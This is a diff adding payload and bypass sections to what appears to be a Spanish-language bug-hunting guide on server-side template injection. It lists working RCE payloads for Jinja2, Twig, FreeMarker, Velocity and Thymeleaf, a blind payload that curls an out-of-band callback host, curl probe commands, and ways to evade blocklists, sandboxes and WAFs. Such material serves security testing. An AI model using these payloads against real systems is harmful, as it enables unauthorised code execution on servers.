@@ -141,6 +141,50 @@ chains_with: [rce, info-disclosure, lfi-rfi]
 - Your OOB listener from ssrf/rce for blind RCE confirmation once an engine is
   confirmed.
 
+## Payloads & Detection Patterns
+
+Guía de caza: fingerprint del engine primero, luego info-disclosure, luego RCE. Para la escalada
+ciega a RCE, el único camino a `Demonstrated` es un callback correlacionado por token (gate OOB).
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Polyglot detection | `${7*7}{{7*7}}<%= 7*7 %>${{7*7}}#{7*7}` | Fingerprint de engine por cuál evalúa a 49 |
+| Jinja2/Twig distinguisher | `{{7*'7'}}` → `7777777` (Jinja2) vs `49` (Twig) | Separar Python de PHP |
+| Info-disclosure | Jinja2 `{{config.items()}}`, `{{self.__init__.__globals__}}`; Twig `{{_self.env.getRuntimeLoaders()}}` | Config/env sin saltar aún a RCE |
+| Jinja2 RCE | `{{cycler.__init__.__globals__.os.popen('id').read()}}`, `{{''.__class__.__mro__[1].__subclasses__()}}` | Sandbox escape → OS cmd |
+| Twig RCE | `{{['id']|filter('system')}}`, `{{_self.env.registerUndefinedFilterCallback('exec')}}` | Version-dependent |
+| FreeMarker RCE | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` | Execute model directo |
+| Velocity RCE | `#set($rt=$e.class.forName("java.lang.Runtime"))...exec("id")` | Reflection a Runtime |
+| Thymeleaf/SpEL | `__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x` | Preprocessing SpEL |
+| Blind | payload con `os.popen('curl http://TOKEN.oast/')` | Confirmar ejecución ciega vía callback |
+
+Surface signals que delatan la clase antes de inyectar:
+- Features: "email template preview", "custom report title", PDF header/footer, CMS HTML widget, error page custom.
+- Aritmética aparentemente evaluada en el reflejo; artefactos de engine en errores (`TemplateSyntaxError`, `Twig\Error\SyntaxError`, `freemarker.core.ParseException`).
+- Stack hints: Flask/Django→Jinja2, Symfony/Drupal→Twig, Spring/Struts→FreeMarker/Velocity/Thymeleaf, Node→Handlebars/EJS/Pug.
+- Campos que documentan su propia sintaxis de variables (`{{user.name}}`).
+
+```bash
+# polyglot probe (un solo request; mirar cuál substring da 49)
+curl -s --data-urlencode "name=\${7*7}{{7*7}}<%= 7*7 %>\${{7*7}}#{7*7}" "https://target/preview"
+# control: confirma que es engine, no una calculadora
+curl -s --data-urlencode "name={{7*'7'}}" "https://target/preview"   # 7777777=Jinja2 / 49=Twig
+```
+
+## Bypass Techniques
+
+Agrupadas por la defensa que evaden; enumerar el target real antes de hardcodear índices.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Blocklist de `{{ }}` | Delimitadores alternos `{%...%}`, `${...}`, `#{...}`, `*{...}` | Cada engine acepta varios delimitadores |
+| Keyword `__class__`/`os` | `|attr('__cla'~'ss__')`, `request['application']`, concat de strings | Evita el match textual del gadget |
+| Filtro de comillas | `request.args`, `()` sin strings, `dict(...)`/listas para construir strings | Evita literales de string |
+| Sandbox (Jinja2) | Cadena `__subclasses__()` a clase con `os`/`subprocess`, `lipsum.__globals__` | Index version-sensible: enumerar, no hardcodear |
+| Sandbox (Twig) | `filter`/`map`/`sort` con callback, `registerUndefinedFilterCallback` | Depende de la versión del sandbox extension |
+| Auto-escape del output | Confirmar que la aritmética evalúa, no solo que `{{ }}` sobrevive | Escape ≠ no-ejecución del template |
+| WAF genérico | URL/encoding del payload, newlines, whitespace en la expresión | El engine normaliza lo que el WAF no |
+
 ## Root Causes
 
 - User input concatenated directly into a template *string* before rendering (`render_template_
